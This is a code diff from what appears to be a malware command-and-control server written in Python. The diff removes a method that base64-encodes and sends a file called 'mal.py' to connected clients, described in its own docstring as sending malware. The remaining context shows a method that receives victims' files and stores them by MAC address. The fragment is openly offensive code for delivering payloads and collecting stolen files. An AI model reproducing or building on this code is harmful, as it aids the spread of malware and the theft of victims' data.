@@ -77,25 +77,6 @@ class Server:
     
         return private_key, public_key
 
-    def send_malicious_code(self, conn):
-        """ Send malware to the client once the connection is established. """
-        file = open(Server.CODE_PATH, "r")
-        data = file.read()
-
-        encoded_payload = base64.b64encode('mal.py'.encode())
-        conn.sendall(encoded_payload)
-        msg = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
-        print("[CLIENT] : " + msg)
-
-        #while data:
-        #    print(len(data))
-        conn.sendall(base64.b64encode(data.encode(Server.FORMAT)))
-        #    data = file.read(1024)
-        file.close()
-        conn.sendall(base64.b64encode("DONE.".encode(Server.FORMAT)))
-        msg = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
-        print("[CLIENT] : " + msg)
-
     def receive_victim_files(self, conn, mac):
         path = os.path.join(Server.WORKING_DIR, mac)
         filename = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
